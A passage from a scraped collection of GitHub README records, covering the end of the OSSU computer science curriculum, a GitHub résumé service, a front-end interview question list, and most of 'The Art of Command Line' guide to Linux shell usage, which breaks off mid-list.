more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nIntroduction to Logic\n10 weeks\n4-8 hours/week\nset theory\n\n\nAutomata Theory\n7 weeks\n10 hours/week\ndiscrete mathematics, logic, algorithms\n\n\nComputational Geometry\n16 weeks\n8 hours/week\nalgorithms, C++\n\n\nIntroduction to Formal Concept Analysis\n6 weeks\n4-6 hours/week\nlogic, probability\n\n\nGame Theory\n8 weeks\nx hours/week\nmathematical thinking, probability, calculus\n\n\n\nAdvanced applications\nThese Coursera Specializations all end with a Capstone project.\nDepending on the course, you may be able to utilize the Capstone as your Final Project for this Computer Science curriculum.\nNote that doing a Specialization with the Capstone at the end always costs money.\nSo if you don't wish to spend money or use the Capstone as your Final, it may be possible to take the courses in the Specialization for free by manually searching for them, but not all allow this.\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nRobotics (Specialization)\n26 weeks\n2-5 hours/week\nlinear algebra, calculus, programming, probability\n\n\nData Mining (Specialization)\n30 weeks\n2-5 hours/week\nmachine learning\n\n\nBig Data (Specialization)\n30 weeks\n3-5 hours/week\nnone\n\n\nInternet of Things (Specialization)\n30 weeks\n1-5 hours/week\nstrong programming\n\n\nCloud Computing (Specialization)\n30 weeks\n2-6 hours/week\nC++ programming\n\n\nFull Stack Web Development (Specialization)\n27 weeks\n2-6 hours/week\nprogramming, databases\n\n\nData Science (Specialization)\n43 weeks\n1-6 hours/week\nnone\n\n\nFunctional Programming in Scala (Specialization)\n29 weeks\n4-5 hours/week\nOne year programming experience\n\n\n\nFinal project\nOSS University is project-focused.\nYou are encouraged to do the assignments and exams for each course, but what really matters is whether you can use your knowledge to solve a real world problem.\nAfter you've gotten through all of Core CS and the parts of Advanced CS relevant to you, you should think about a problem that you can solve using the knowledge you've acquired.\nNot only does real project work look great on a resume, but the project will also validate and consolidate your knowledge.\nYou can create something entirely new, or you can find an existing project that needs help via websites like\nCodeTriage\nor\nFirst Timers Only.\nAnother option is using the Capstone project from taking one of the Specializations in Advanced applications;\nwhether or not this makes sense depends on the course, the project, and whether or not the course's Honor Code permits you to display your work publicly.\nIn some cases, it may not be permitted;\ndo not violate your course's Honor Code!\nPut the OSSU-CS badge in the README of your repository!\n\n\nMarkdown: [![Open Source Society University - Computer Science](https://img.shields.io/badge/OSSU-computer--science-blue.svg)](https://github.com/ossu/computer-science)\nHTML: <a href=\"https://github.com/ossu/computer-science\"><img alt=\"Open Source Society University - Computer Science\" src=\"https://img.shields.io/badge/OSSU-computer--science-blue.svg\"></a>\n\nEvaluation\nUpon completing your final project, submit your project's information to PROJECTS\nvia a pull request and use our community channels to announce it to your fellow students.\nYour peers and mentors from OSSU will then informally evaluate your project.\nYou will not be \"graded\" in the traditional sense \u2014 everyone has their own measurements for what they consider a success.\nThe purpose of the evaluation is to act as your first announcement to the world that you are a computer scientist\nand to get experience listening to feedback \u2014 both positive and negative \u2014 and taking it in stride.\nThe final project evaluation has a second purpose: to evaluate whether OSSU,\nthrough its community and curriculum, is successful in its mission to guide independent learners in obtaining a world-class computer science education.\nCooperative work\nYou can create this project alone or with other students!\nWe love cooperative work!\nUse our channels to communicate with other fellows to combine and create new projects!\nWhich programming languages should I use?\nMy friend, here is the best part of liberty!\nYou can use any language that you want to complete the final project.\nThe important thing is to internalize the core concepts and to be able to use them with whatever tool (programming language) that you wish.\nPro CS\nAfter completing the requirements of the curriculum above, you will have completed the equivalent of a full bachelor's degree in Computer Science, or quite close to one.\nYou can stop in the Advanced CS section, but the next step to completing your studies is to develop skills and knowledge in a specific domain.\nMany of these courses are graduate-level.\nChoose one or more of the following specializations:\n\nMastering Software Development in R Specialization by Johns Hopkins University\nArtificial Intelligence Engineer Nanodegree by IBM, Amazon, and Didi\nMachine Learning Engineer Nanodegree by kaggle\nCybersecurity MicroMasters by the Rochester Institute of Technology\nAndroid Developer Nanodegree by Google\n\nThese aren't the only specializations you can choose. Check the following websites for more options:\n\nedX: xSeries\nCoursera: Specializations\nUdacity: Nanodegree\n\nWhere to go next?\n\nLook for a job as a developer!\nCheck out the readings for classic books you can read that will sharpen your skills and expand your knowledge.\nJoin a local developer meetup (e.g. via meetup.com).\nPay attention to emerging technologies in the world of software development:\n\nExplore the actor model through Elixir, a new functional programming language for the web based on the battle-tested Erlang Virtual Machine!\nExplore borrowing and lifetimes through Rust, a systems language which achieves memory- and thread-safety without a garbage collector!\nExplore dependent type systems through Idris, a new Haskell-inspired language with unprecedented support for type-driven development.\n\n\n\n\nCode of conduct\nOSSU's code of conduct.\nCommunity\n\nSubscribe to our newsletter.\nUse our forum if you need some help.\nYou can also interact through GitHub issues.\nWe also have a chat room! \nAdd Open Source Society University to your Linkedin profile!\n\n\nPS: A forum is an ideal way to interact with other students as we do not lose important discussions, which usually occur in communication via chat apps.\nPlease use our forum for important discussions.\n\nHow to show your progress\n\nCreate an account in Trello.\nCopy this board to your personal account.\nSee how to copy a board here.\n\nNow that you have a copy of our official board, you just need to pass the cards to the Doing column or Done column as you progress in your study.\nWe also have labels to help you have more control through the process.\nThe meaning of each of these labels is:\n\nMain Curriculum: cards with that label represent courses that are listed in our curriculum.\nExtra Resources: cards with that label represent courses that were added by the student.\nDoing: cards with that label represent courses the student is current doing.\nDone: cards with that label represent courses finished by the student.\nThose cards should also have the link for at least one project/article built with the knowledge acquired in such course.\nSection: cards with that label represent the section that we have in our curriculum.\nThose cards with the Section label are only to help the organization of the Done column.\nYou should put the Course's cards below its respective Section's card.\n\nThe intention of this board is to provide our students a way to track their progress, and also the ability to show their progress through a public page for friends, family, employers, etc.\nYou can change the status of your board to be public or private.\nTeam\n\nEric Douglas: founder of OSSU and co-maintainer of all its curricula\nhanjiexi: lead technical maintainer\nwaciumawanjohi: lead academic maintainer\nContributors\n\nReferences\n\nGoogle - Guide for Technical Development\nCoursera\nedX\nUdacity\nStanford University\nCarnegie Mellon University: Computer Science Major Requirements\nMIT Open Courseware\nTeach Yourself Computer Science\nObtaining a Thorough CS Background Online"}, {"title": "resume/resume.github.com", "language": "JavaScript", "content": "GitHub R\u00e9sum\u00e9\nA service that creates a r\u00e9sum\u00e9 based on your GitHub repos/activity.\nGitHub R\u00e9sum\u00e9 is opt-in. To make your resume visible, just star this project. To view your r\u00e9sum\u00e9, go to https://resume.github.io/?yourusername or follow the instructions on the home page.\nGreat for all the tech-savy bosses who want to have a quick view of person's git/github activity, before the interview.\nDevelopment\nTo run the app in development mode:\n$ rackup config.ru\n\n(You must have Ruby and the rack gem installed.)"}, {"title": "h5bp/Front-end-Developer-Interview-Questions", "language": "HTML", "content": "Front-end Job Interview Questions\nThis file contains a number of front-end interview questions that can be used when vetting potential candidates. It is by no means recommended to use every single question here on the same candidate (that would take hours). Choosing a few items from this list should help you vet the intended skills you require.\nNote: Keep in mind that many of these questions are open-ended and could lead to interesting discussions that tell you more about the person's capabilities than a straight answer would.\nTable of Contents\n\nGeneral Questions\nHTML Questions\nCSS Questions\nJS Questions\nAccessibility Questions (external link)\nTesting Questions\nPerformance Questions\nNetwork Questions\nCoding Questions\nFun Questions\n\nGetting Involved\n\nContributors\nHow to Contribute\nLicense\n\nContributors:\nThis project started in 2009 as a collaboration of @paul_irish @bentruyman @cowboy @ajpiano @SlexAxton @boazsender @miketaylr @vladikoff @gf3 @jon_neal @sambreed and @iansym.\nThis project is currently maintained by:\n\n@roblarsen\n@cezaraugusto\n@vvscode\n\nIt has since been active thanks to these incredibly wonderful people.\nFeeling inspired? Check our Contributing guide to get started!"}, {"title": "jlevy/the-art-of-command-line", "language": "HTML", "content": "\ud83c\udf0d\n\u010ce\u0161tina \u2219 Deutsch \u2219 \u0395\u03bb\u03bb\u03b7\u03bd\u03b9\u03ba\u03ac \u2219 English \u2219 Espa\u00f1ol \u2219 Fran\u00e7ais \u2219 Indonesia \u2219 Italiano \u2219 \u65e5\u672c\u8a9e \u2219 \ud55c\uad6d\uc5b4 \u2219 Portugu\u00eas \u2219 Rom\u00e2n\u0103 \u2219 \u0420\u0443\u0441\u0441\u043a\u0438\u0439 \u2219 Sloven\u0161\u010dina \u2219 \u0423\u043a\u0440\u0430\u0457\u043d\u0441\u044c\u043a\u0430 \u2219 \u7b80\u4f53\u4e2d\u6587 \u2219 \u7e41\u9ad4\u4e2d\u6587\nThe Art of Command Line\n\n\n\nMeta\nBasics\nEveryday use\nProcessing files and data\nSystem debugging\nOne-liners\nObscure but useful\nmacOS only\nWindows only\nMore resources\nDisclaimer\n\n\nFluency on the command line is a skill often neglected or considered arcane, but it improves your flexibility and productivity as an engineer in both obvious and subtle ways. This is a selection of notes and tips on using the command-line that we've found useful when working on Linux. Some tips are elementary, and some are fairly specific, sophisticated, or obscure. This page is not long, but if you can use and recall all the items here, you know a lot.\nThis work is the result of many authors and translators.\nSome of this\noriginally\nappeared\non Quora,\nbut it has since moved to GitHub, where people more talented than the original author have made numerous improvements.\nPlease submit a question if you have a question related to the command line. Please contribute if you see an error or something that could be better!\nMeta\nScope:\n\nThis guide is both for beginners and the experienced. The goals are breadth (everything important), specificity (give concrete examples of the most common case), and brevity (avoid things that aren't essential or digressions you can easily look up elsewhere). Every tip is essential in some situation or significantly saves time over alternatives.\nThis is written for Linux, with the exception of the \"macOS only\" and \"Windows only\" sections. Many of the other items apply or can be installed on other Unices or macOS (or even Cygwin).\nThe focus is on interactive Bash, though many tips apply to other shells and to general Bash scripting.\nIt includes both \"standard\" Unix commands as well as ones that require special package installs -- so long as they are important enough to merit inclusion.\n\nNotes:\n\nTo keep this to one page, content is implicitly included by reference. You're smart enough to look up more detail elsewhere once you know the idea or command to Google. Use apt, yum, dnf, pacman, pip or brew (as appropriate) to install new programs.\nUse Explainshell to get a helpful breakdown of what commands, options, pipes etc. do.\n\nBasics\n\n\nLearn basic Bash. Actually, type man bash and at least skim the whole thing; it's pretty easy to follow and not that long. Alternate shells can be nice, but Bash is powerful and always available (learning only zsh, fish, etc., while tempting on your own laptop, restricts you in many situations, such as using existing servers).\n\n\nLearn at least one text-based editor well. The nano editor is one of the simplest for basic editing (opening, editing, saving, searching). However, for the power user in a text terminal, there is no substitute for Vim (vi), the hard-to-learn but venerable, fast, and full-featured editor. Many people also use the classic Emacs, particularly for larger editing tasks. (Of course, any modern software developer working on an extensive project is unlikely to use only a pure text-based editor and should also be familiar with modern graphical IDEs and tools.)\n\n\nFinding documentation:\n\nKnow how to read official documentation with man (for the inquisitive, man man lists the section numbers, e.g. 1 is \"regular\" commands, 5 is files/conventions, and 8 are for administration). Find man pages with apropos.\nKnow that some commands are not executables, but Bash builtins, and that you can get help on them with help and help -d. You can find out whether a command is an executable, shell builtin or an alias by using type command.\ncurl cheat.sh/command will give a brief \"cheat sheet\" with common examples of how to use a shell command.\n\n\n\nLearn about redirection of output and input using > and < and pipes using |. Know > overwrites the output file and >> appends. Learn about stdout and stderr.\n\n\nLearn about file glob expansion with * (and perhaps ? and [...]) and quoting and the difference between double \" and single ' quotes. (See more on variable expansion below.)\n\n\nBe familiar with Bash job management: &, ctrl-z, ctrl-c, jobs, fg, bg, kill, etc.\n\n\nKnow ssh, and the basics of passwordless authentication, via ssh-agent, ssh-add, etc.\n\n\nBasic file management: ls and ls -l (in particular, learn what every column in ls -l means), less, head, tail and tail -f (or even better, less +F), ln and ln -s (learn the differences and advantages of hard versus soft links), chown, chmod, du (for a quick summary of disk usage: du -hs *). For filesystem management, df, mount, fdisk, mkfs, lsblk. Learn what an inode is (ls -i or df -i).\n\n\nBasic network management: ip or ifconfig, dig, traceroute, route.\n\n\nLearn and use a version control management system, such as git.\n\n\nKnow regular expressions well, and the various flags to grep/egrep. The -i, -o, -v, -A, -B, and -C options are worth knowing.\n\n\nLearn to use apt-get, yum, dnf or pacman (depending on distro) to find and install packages. And make sure you have pip to install Python-based command-line tools (a few below are easiest to install via pip).\n\n\nEveryday use\n\n\nIn Bash, use Tab to complete arguments or list all available commands and ctrl-r to search through command history (after pressing, type to search, press ctrl-r repeatedly to cycle through more matches, press Enter to execute the found command, or hit the right arrow to put the result in the current line to allow editing).\n\n\nIn Bash, use ctrl-w to delete the last word, and ctrl-u to delete the content from current cursor back to the start of the line. Use alt-b and alt-f to move by word, ctrl-a to move cursor to beginning of line,  ctrl-e to move cursor to end of line, ctrl-k to kill to the end of the line, ctrl-l to clear the screen. See man readline for all the default keybindings in Bash. There are a lot. For example alt-. cycles through previous arguments, and alt-* expands a glob.\n\n\nAlternatively, if you love vi-style key-bindings, use set -o vi (and set -o emacs to put it back).\n\n\nFor editing long commands, after setting your editor (for example export EDITOR=vim), ctrl-x ctrl-e will open the current command in an editor for multi-line editing. Or in vi style, escape-v.\n\n\nTo see recent commands, use history. Follow with !n (where n is the command number) to execute again. There are also many abbreviations you can use, the most useful probably being !$ for last argument and !! for last command (see \"HISTORY EXPANSION\" in the man page). However, these are often easily replaced with ctrl-r and alt-..\n\n\nGo to your home directory with cd. Access files relative to your home directory with the ~ prefix (e.g. ~/.bashrc). In sh scripts refer to the home directory as $HOME.\n\n\nTo go back to the previous working directory: cd -.\n\n\nIf you are halfway through typing a command but change your mind, hit alt-# to add a # at the beginning and enter it as a comment (or use ctrl-a, #, enter). You can then return to it later via command history.\n\n\nUse xargs (or parallel). It's very powerful. Note you can control how many items execute per line (-L) as well as parallelism (-P). If you're not sure if it'll do the right thing, use xargs echo first. Also, -I{} is handy. Examples:\n\n\n      find . -name '*.py' | xargs grep some_function\n      cat hosts | xargs -I{} ssh root@{} hostname\n\n\npstree -p is a helpful display of the process tree.\n\n\nUse pgrep and pkill to find or signal processes by name (-f is helpful).\n\n\nKnow the various signals you can send processes. For example, to suspend a process, use kill -STOP [pid]. For the full list, see man 7 signal\n\n\nUse nohup or disown if you want a background process to keep running forever.\n\n\nCheck what processes are listening via netstat -lntp or ss -plat (for TCP; add -u for UDP) or lsof -iTCP -sTCP:LISTEN -P -n (which also works on macOS).\n\n\nSee also lsof and fuser for open sockets and files.\n\n\nSee uptime or w to know how long the system has been running.\n\n\nUse alias to create shortcuts for commonly used commands. For example, alias ll='ls -latr' creates a new alias ll.\n\n\nSave aliases, shell settings, and functions you commonly use in ~/.bashrc, and arrange for login shells to source it. This will make your setup available in all your shell sessions.\n\n\nPut the settings of environment variables as well as commands that should be executed when you login in ~/.bash_profile. Separate configuration will be needed for shells you launch from graphical environment logins and cron jobs.\n\n\nSynchronize your configuration files (e.g. .bashrc and .bash_profile) among various computers with Git.\n\n\nUnderstand that care is needed when variables and filenames include whitespace. Surround your Bash variables with quotes, e.g. \"$FOO\". Prefer the -0 or -print0 options to enable null characters to delimit filenames, e.g. locate -0 pattern | xargs -0 ls -al or find / -print0 -type d | xargs -0 ls -al. To iterate on filenames containing whitespace in a for loop, set your IFS to be a newline only using IFS=$'\\n'.\n\n\nIn Bash scripts, use set -x (or the variant set -v, which logs raw input, including unexpanded variables and comments) for debugging output. Use strict modes unless you have a good reason not to: Use set -e to abort on errors (nonzero exit code). Use set -u to detect unset variable usages. Consider set -o pipefail too, to abort on errors within pipes (though read up on it more if you do, as this topic is a bit subtle). For more involved scripts, also use trap on EXIT or ERR. A useful habit is to start a script like this, which will make it detect and abort on common errors and print a message:\n\n\n      set -euo pipefail\n      trap \"echo 'error: Script failed: see failed command above'\" ERR\n\nIn Bash scripts, subshells (written with parentheses) are convenient ways to group commands. A common example is to temporarily move to a different working directory, e.g.\n\n      # do something in current dir\n      (cd /some/other/dir && other-command)\n      # continue in original dir\n\n\nIn Bash, note there are lots of kinds of variable expansion. Checking a variable exists: ${name:?error message}. For example, if a Bash script requires a single argument, just write input_file=${1:?usage: $0 input_file}. Using a default value if a variable is empty: ${name:-default}. If you want to have an additional (optional) parameter added to the previous example, you can use something like output_file=${2:-logfile}. If $2 is omitted and thus empty, output_file will be set to logfile. Arithmetic expansion: i=$(( (i + 1) % 5 )). Sequences: {1..10}. Trimming of strings: ${var%suffix} and ${var#prefix}. For example if var=foo.pdf, then echo ${var%.pdf}.txt prints foo.txt.\n\n\nBrace expansion using {...} can reduce having to re-type similar text and automate combinations of items.  This is helpful in examples like mv foo.{txt,pdf} some-dir (which moves both files), cp somefile{,.bak} (which expands to cp somefile somefile.bak) or mkdir -p test-{a,b,c}/subtest-{1,2,3} (which expands all possible combinations and creates a directory tree). Brace expansion is performed before any other expansion.\n\n\nThe order of expansions is: brace expansion; tilde expansion, parameter and variable expansion, arithmetic expansion, and command substitution (done in a left-to-right fashion); word splitting; and filename expansion. (For example, a range like {1..20} cannot be expressed with variables using {$a..$b}. Use seq or a for loop instead, e.g., seq $a $b or for((i=a; i<=b; i++)); do ... ; done.)\n\n\nThe output of a command can be treated like a file via <(some command) (known as process substitution). For example, compare local /etc/hosts with a remote one:\n\n\n      diff /etc/hosts <(ssh somehost cat /etc/hosts)\n\nWhen writing scripts you may want to put all of your code in curly braces. If the closing brace is missing, your script will be prevented from executing due to a syntax error. This makes sense when your script is going to be downloaded from the web, since it prevents partially downloaded scripts from executing:\n\n{\n      # Your code here\n}\n\nA \"here document\" allows redirection of multiple lines of input as if from a file:\n\ncat <<EOF\ninput\non multiple lines\nEOF\n\n\n\nIn Bash, redirect both standard output and standard error via: some-command >logfile 2>&1 or some-command &>logfile. Often, to ensure a command does not leave an open file handle to standard input, tying it to the terminal you are in, it is also good practice to add </dev/null.\n\n\nUse man ascii for a good ASCII table, with hex and decimal values. For general encoding info, man unicode, man utf-8, and man latin1 are helpful.\n\n\nUse screen or tmux to multiplex the screen, especially useful on remote ssh sessions and to detach and re-attach to a session. byobu can enhance screen or tmux by providing more information and easier management. A more minimal alternative for session persistence only is dtach.\n\n\nIn ssh, knowing how to port tunnel with -L or -D (and occasionally -R) is useful, e.g. to access web sites from a remote server.\n\n\nIt can be useful to make a few optimizations to your ssh configuration; for example, this ~/.ssh/config contains settings to avoid dropped connections in certain network environments, uses compression (which is helpful with scp over low-bandwidth connections), and multiplex channels to the same server with a local control file:\n\n\n      TCPKeepAlive=yes\n      ServerAliveInterval=15\n      ServerAliveCountMax=6\n      Compression=yes\n      ControlMaster auto\n      ControlPath /tmp/%r@%h:%p\n      ControlPersist yes\n\n\n\nA few other options relevant to ssh are security sensitive and should be enabled with care, e.g. per subnet or host or in trusted networks: StrictHostKeyChecking=no, ForwardAgent=yes\n\n\nConsider mosh an alternative to ssh that uses UDP, avoiding dropped connections and adding convenience on the road (requires server-side setup).\n\n\nTo get the permissions on a file in octal form, which is useful for system configuration but not available in ls and easy to bungle, use something like\n\n\n      stat -c '%A %a %n' /etc/timezone\n\n\nFor interactive selection of values from the output of another command, use percol or fzf.\n\n\nFor interaction with files based on the output of another command (like git), use fpp (PathPicker).\n\n\nFor a simple web server for all files in the current directory (and subdirs), available to anyone on your network, use:\npython -m SimpleHTTPServer 7777 (for port 7777 and Python 2) and python -m http.server 7777 (for port 7777 and Python 3).\n\n\nFor running a command as another user, use sudo. Defaults to running as root; use -u to specify another user. Use -i to login as that user (you will be asked for your password).\n\n\nFor switching the shell to another user, use su username or su - username. The latter with \"-\" gets an environment as if another user just logged in. Omitting the username defaults to root. You will be asked for the password of the user you are switching to.\n\n\nKnow about the 128K limit on command lines. This \"Argument list too long\" error is common when wildcard matching large numbers of files. (When this happens alternatives like find and xargs may help.)\n\n\nFor a basic calculator (and of course access to Python in general), use the python interpreter. For example,\n\n\n>>> 2+3\n5\n\nProcessing files and data\n\n\nTo locate a file by name in the current directory, find . -iname '*something*' (or similar). To find a file anywhere by name, use locate something (but bear in mind updatedb may not have indexed recently created files).\n\n\nFor general searching through source or data files, there are several options more advanced or faster than grep -r, including (in rough order from older to newer) ack, ag (\"the silver searcher\"), and rg (ripgrep).\n\n\nTo convert HTML to text: lynx -dump -stdin\n\n\nFor Markdown, HTML, and all kinds of document conversion, try pandoc. For example, to convert a Markdown document to Word format: pandoc README.md --from markdown --to docx -o temp.docx\n\n\nIf you must handle XML, xmlstarlet is old but good.\n\n\nFor JSON, use jq. For interactive use, also see jid and jiq.\n\n\nFor YAML, use shyaml.\n\n\nFor Excel or CSV files, csvkit provides in2csv, csvcut, csvjoin, csvgrep, etc.\n\n\nFor Amazon S3, s3cmd is convenient and s4cmd is faster. Amazon's aws and the improved saws are essential for other AWS-related tasks.\n\n\nKnow about sort and uniq, including uniq's -u and -d options -- see one-liners below. See also comm.\n\n\nKnow about cut, paste, and join to manipulate text files. Many people use cut but forget about join.\n\n\nKnow about wc to count newlines (-l), characters (-m), words (-w) and bytes (-c).\n\n\nKnow about tee to copy from stdin to a file and also to stdout, as in ls -al | tee file.txt.\n\n\nFor more complex calculations, including grouping, reversing fields, and statistical calculations, consider datamash.\n\n\nKnow that locale affects a lot of command line tools in subtle ways, including sorting order (collation) and performance. Most Linux installations will set LANG or other locale variables to a local setting like US English. But be aware sorting will change if you change locale. And know i18n routines can make sort or other commands run many times slower. In some situations (such as the set operations or uniqueness operations below) you can safely ignore slow i18n routines entirely and use traditional byte-based sort order, using export LC_ALL=C.\n\n\nYou can set a specific command's environment by prefixing its invocation with the environment variable settings, as in TZ=Pacific/Fiji date.\n\n\nKnow basic awk and sed for simple data munging. See One-liners for examples.\n\n\nTo replace all occurrences of a string in place, in one or more files:\n\n\n      perl -pi.bak -e 's/old-string/new-string/g' my-files-*.txt\n\nTo rename multiple files and/or search and replace within files, try repren. (In some cases the rename command also allows multiple renames, but be careful as its functionality is not the same on all Linux distributions.)\n\n      # Full rename of filenames, directories, and contents foo -> bar:\n      repren --full --preserve-case --from foo --to bar .\n      # Recover backup files whatever.bak -> whatever:\n      repren --renames --from '(.*)\\.bak' --to '\\1' *.bak\n      # Same as above, using rename, if available:\n      rename 's/\\.bak$//' *.bak\n\nAs the man page says, rsync really is a fast and extraordinarily versatile file copying tool. It's known for synchronizing between machines but is equally useful locally. When security restrictions allow, using rsync instead of scp allows recovery of a transfer without restarting from scratch. It also is among the fastest ways to delete large numbers of files:\n\nmkdir empty && rsync -r --delete empty/ some-dir && rmdir some-dir\n\n\nFor monitoring progress when processing files, use pv, pycp, pmonitor, progress, rsync --progress, or, for block-level copying, dd status=progress.\n\n\nUse shuf to shuffle or select random lines from a file.\n\n\nKnow sort's options. For numbers, use -n, or -h for handling human-readable numbers (e.g. from du -h). Know how keys work (-t and -k). In particular, watch out that you need to write -k1,1 to sort by only the first field; -k1 means sort according to the whole line. Stable sort (sort -s) can be useful. For example, to sort first by field 2, then secondarily by field 1, you can use sort -k1,1 | sort -s -k2,2.\n\n\nIf you ever need to write a tab literal in a command line in Bash (e.g. for the -t argument to sort), press ctrl-v [Tab] or write $'\\t' (the latter is better as you can copy/paste it).\n\n\nThe standard tools for patching source code are diff and patch. See also diffstat for summary statistics of a diff and sdiff for a side-by-side diff. Note diff -r works for entire directories. Use diff -r tree1 tree2 | diffstat for a summary of changes. Use vimdiff to compare and edit files.\n\n\nFor binary files, use hd, hexdump or xxd for simple hex dumps and bvi, hexedit or biew for binary editing.\n\n\nAlso for binary files, strings (plus grep, etc.) lets you find bits of text.\n\n\nFor binary diffs (delta compression), use xdelta3.\n\n\nTo convert text encodings, try iconv. Or uconv for more advanced use; it supports some advanced Unicode things. For example:\n\n\n      # Displays hex codes or actual names of characters (useful for debugging):\n      uconv -f utf-8 -t utf-8 -x '::Any-Hex;' < input.txt\n      uconv -f utf-8 -t utf-8 -x '::Any-Name;' < input.txt\n      # Lowercase and removes all accents (by expanding and dropping them):\n      uconv -f utf-8 -t utf-8 -x '::Any-Lower; ::Any-NFD; [:Nonspacing Mark:] >; ::Any-NFC;' < input.txt > output.txt\n\n\nTo split files into pieces, see split (to split by size) and csplit (to split by a pattern).\n\n\nDate and time: To get the current date and time in the helpful ISO 8601 format, use date -u +\"%Y-%m-%dT%H:%M:%SZ\" (other options are problematic). To manipulate date and time expressions, use dateadd, datediff, strptime etc. from dateutils.\n\n\nUse zless, zmore, zcat, and zgrep to operate on compressed files.\n\n\nFile attributes are settable via chattr and offer a lower-level alternative to file permissions. For example, to protect against accidental file deletion the immutable flag:  sudo chattr +i /critical/directory/or/file\n\n\nUse getfacl and setfacl to save and restore file permissions. For example:\n\n\n   getfacl -R /some/path > permissions.txt\n   setfacl --restore=permissions.txt\n\nTo create empty files quickly, use truncate (creates sparse file), fallocate (ext4, xfs, btrfs and ocfs2 filesystems), xfs_mkfile (almost any filesystems, comes in xfsprogs package), mkfile (for Unix-like systems like Solaris, Mac OS).\n\nSystem debugging\n\n\nFor web debugging, curl and curl -I are handy, or their wget equivalents, or the more modern httpie.\n\n\nTo know current cpu/disk status, the classic tools are top (or the better htop), iostat, and iotop. Use iostat -mxz 15 for basic CPU and detailed per-partition disk stats and performance insight.\n\n\nFor network connection details, use netstat and ss.\n\n\nFor a quick overview of what's happening on a system, dstat is especially useful. For broadest overview with details, use glances.\n\n\nTo know memory status, run and understand the output of free and vmstat. In particular, be aware the \"cached\" value is memory held by the Linux kernel as file cache, so effectively counts toward the \"free\" value.\n\n\nJava system debugging is a different kettle of fish, but a simple trick on Oracle's and some other JVMs is that you can run kill -3 <pid> and a full stack trace and heap summary (including generational garbage collection details, which can be highly informative) will be dumped to stderr/logs. The JDK's jps, jstat, jstack, jmap are useful. SJK tools are more advanced.\n\n\nUse mtr as a better traceroute, to identify network issues.\n\n\nFor looking at why a disk is full, ncdu saves time over the usual commands like du -sh *.\n\n\nTo find which socket or process is using bandwidth, try iftop or nethogs.\n\n\nThe ab tool (comes with Apache) is helpful for quick-and-dirty checking of web server performance. For more complex load testing, try siege.\n\n\nFor more serious network debugging, wireshark, tshark, or ngrep.\n\n\nKnow about strace and ltrace. These can be helpful if a program is failing, hanging, or crashing, and you don't know why, or if you want to get a general idea of performance. Note the profiling option (-c), and the ability to attach to a running process (-p). Use trace child option (-f) to avoid missing important calls.\n\n\nKnow about ldd to check shared libraries etc \u2014 but never run it on untrusted files.\n\n\nKnow how to connect to a running process with gdb and get its stack traces.\n\n\nUse /proc. It's amazingly helpful sometimes when debugging live problems. Examples: /proc/cpuinfo, /proc/meminfo, /proc/cmdline, /proc/xxx/cwd, /proc/xxx/exe, /proc/xxx/fd/, /proc/xxx/smaps (where xxx is the process id or pid).\n\n\nWhen debugging why something went wrong in the past, sar can be very helpful. It shows historic statistics on CPU, memory, network, etc.\n\n\nFor deeper systems and performance analyses, look at stap (SystemTap), perf, and sysdig.\n\n\nCheck what OS you're on with uname or uname -a (general Unix/kernel info) or lsb_release -a (Linux distro info).\n\n\nUse dmesg whenever something's acting really funny (it could be hardware or driver issues).\n\n\nIf you delete a file and it doesn't free up expected disk space as reported by du, check whether the file is in use by a process:\nlsof | grep deleted | grep \"filename-of-my-big-file\"\n\n\nOne-liners\nA few examples of piecing together commands:\n\nIt is remarkably helpful sometimes that you can do set intersection, union, and difference of text files via sort/uniq. Suppose a and b are text files that are already uniqued. This is fast, and works on files of arbitrary size, up to many gigabytes. (Sort is not limited by memory, though you may need to use the -T option if /tmp is on a small root partition.) See also the note about LC_ALL above and sort's -u option (left out for clarity below).\n\n      sort a b | uniq > c   # c is a union b\n      sort a b | uniq -d > c   # c is a intersect b\n      sort a b b | uniq -u > c   # c is set difference a - b\n\n\nUse grep . * to quickly examine the contents of all files in a directory (so each line is paired with the filename), or head -100 * (so each file has a heading). This can be useful for directories filled with config settings like those in /sys, /proc, /etc.\n\n\nSumming all numbers in the third column of a text file (this is probably 3X faster and 3X less code than equivalent Python):\n\n\n      awk '{ x += $3 } END { print x }' myfile\n\nTo see sizes/dates on a tree of files, this is like a recursive ls -l but is easier to read than ls -lR:\n\n      find . -type f -ls\n\nSay you have a text file, like a web server log, and a certain value that appears on some lines, such as an acct_id parameter that is present in the URL. If you want a tally of how many requests for each acct_id:\n\n      egrep -o 'acct_id=[0-9]+' access.log | cut -d= -f2 | sort | uniq -c | sort -rn\n\n\nTo continuously monitor changes, use watch, e.g. check changes to files in a directory with watch -d -n 2 'ls -rtlh | tail' or to network settings while troubleshooting your wifi settings with watch -d -n 2 ifconfig.\n\n\nRun this function to get a random tip from this document (parses Markdown and extracts an item):\n\n\n      function taocl() {\n        curl -s https://raw.githubusercontent.com/jlevy/the-art-of-command-line/master/README.md |\n          sed '/cowsay[.]png/d' |\n          pandoc -f markdown -t html |\n          xmlstarlet fo --html --dropdtd |\n          xmlstarlet sel -t -v \"(html/body/ul/li[count(p)>0])[$RANDOM mod last()+1]\" |\n          xmlstarlet unesc | fmt -80 | iconv -t US\n      }\nObscure but useful\n\n\nexpr: perform arithmetic or boolean operations or evaluate regular expressions\n\n\nm4: simple macro processor\n\n\nyes: print a string a lot\n\n\ncal: nice calendar\n\n\nenv: run a command (useful in scripts)\n\n\nprintenv: print out environment variables (useful in debugging and scripts)\n\n\nlook: find English words (or lines in a file) beginning with a string\n\n\ncut, paste and join: data manipulation\n\n\nfmt: format text paragraphs\n\n\npr: format text into pages/columns\n\n\nfold: wrap lines of text\n\n\ncolumn: format text fields into aligned, fixed-width columns or tables\n\n\nexpand and unexpand: convert between tabs and spaces\n\n\nnl: add line numbers\n\n\nseq: print numbers\n\n\nbc: calculator\n\n\nfactor: factor integers\n\n\ngpg: encrypt and sign files\n\n\ntoe: table of terminfo entries\n\n\nnc: network debugging and data transfer\n\n\nsocat: socket relay and tcp port forwarder (similar to netcat)\n\n\nslurm: network traffic visualization\n\n\ndd: moving data between files or devices\n\n\nfile: identify type of a file\n\n\ntree: display directories and subdirectories as a nesting tree; like ls but recursive\n\n\nstat: file info\n\n\ntime: execute and time a command\n\n\ntimeout: execute a command for specified amount of time and stop the process when the specified amount of time completes.\n\n\nlockfile: create semaphore file that can only be removed by rm -f\n\n\nlogrotate: rotate, compress and mail logs.\n\n\nwatch: run a command repeatedly, showing results and/or highlighting changes\n\n\nwhen-changed: runs any command you specify whenever it sees file changed. See inotifywait and 